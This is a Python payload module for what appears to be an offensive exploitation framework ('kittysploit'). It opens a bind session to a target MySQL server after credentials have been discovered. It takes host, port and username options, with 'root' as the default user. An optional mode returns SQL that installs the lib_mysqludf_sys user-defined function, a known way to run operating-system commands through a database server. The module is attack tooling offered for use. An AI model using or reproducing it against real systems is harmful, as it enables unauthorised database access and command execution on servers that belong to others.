#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.mysql_bind import build_mysql_bind_hint, build_mysql_udf_exec_sql


class Module(Payload):
    __info__ = {
        "name": "MySQL BIND Session",
        "description": (
            "BIND payload for listeners/database/mysql. Operator connects to the "
            "target MySQL server after credential discovery (no reverse agent)."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.MULTI,
        "listener": "listeners/database/mysql",
        "handler": Handler.BIND,
        "session_type": SessionType.MYSQL,
    }

    rhost = OptString("127.0.0.1", "MySQL server host", True)
    rport = OptPort(3306, "MySQL server port", True)
    username = OptString("root", "MySQL username", True)
    password = OptString("", "MySQL password", False)
    database = OptString("", "Default database (optional)", False)
    delivery = OptChoice(
        "hint",
        "hint = connection marker; udf_sql = lib_mysqludf_sys install statements",
        False,
        choices=["hint", "udf_sql"],
    )

    def generate(self):
        if str(self.delivery or "hint") == "udf_sql":
            return build_mysql_udf_exec_sql()
        return build_mysql_bind_hint(
            str(self.rhost),
            int(self.rport or 3306),
            str(self.username or "root"),
            str(self.database or ""),
        )
